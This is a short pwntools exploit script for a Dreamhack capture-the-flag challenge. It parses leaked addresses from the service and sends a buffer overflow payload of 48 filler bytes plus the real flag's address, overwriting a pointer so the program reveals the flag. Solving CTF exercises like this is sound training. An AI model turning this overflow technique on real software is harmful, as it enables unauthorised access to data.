#!/usr/bin/env python3
from pwn import *

PORT =  24290
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000013A9
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

p.recvuntil(b"address: ")
fake_flag_addr = int(p.recvline()[:-1], 16)
p.recvuntil(b"address: ")
buf_addr = int(p.recvline()[:-1], 16)
p.recvuntil(b"address): ")
real_flag_addr = int(p.recvline()[:-1], 16)

log.info("fake_flag_addr: " + hex(fake_flag_addr))
log.info("buf_addr: " + hex(buf_addr))
log.info("real_flag_addr: " + hex(real_flag_addr))

pl = b"A"*0x30 + p64(real_flag_addr)
p.send(pl)

p.interactive()